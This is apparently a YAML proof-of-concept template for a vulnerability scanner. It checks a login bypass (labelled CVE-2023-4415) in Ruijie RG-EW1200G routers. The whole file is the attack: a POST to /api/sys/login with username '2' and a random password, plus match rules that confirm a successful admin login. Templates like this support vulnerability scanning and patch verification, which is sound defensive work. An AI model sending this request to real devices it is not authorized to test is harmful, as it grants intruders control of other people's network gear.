id: poc-yaml-ruijie-rg-ew1200g-login-bypass
info:
  name: 锐捷 RG-EW1200G 登录绕过漏洞（CVE-2023-4415）
  severity: high
  tags:
  - CVE-2023-4415
  - 两高一弱
  finger: RG-EW1200G
variables:
  t1: random_int(100,10000)
requests:
- method: POST
  path: /api/sys/login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: '{"username":"2","password":"{{.t1}}","timestamp":1698220385000}

    '
  expression: status_code == 200 && contains(body,"\"msg\":\"登入成功\"") && contains(body,"\"result\":\"ok\"")
    && contains(body,"\"dev_mode\":\"gateway\"")
transport: http
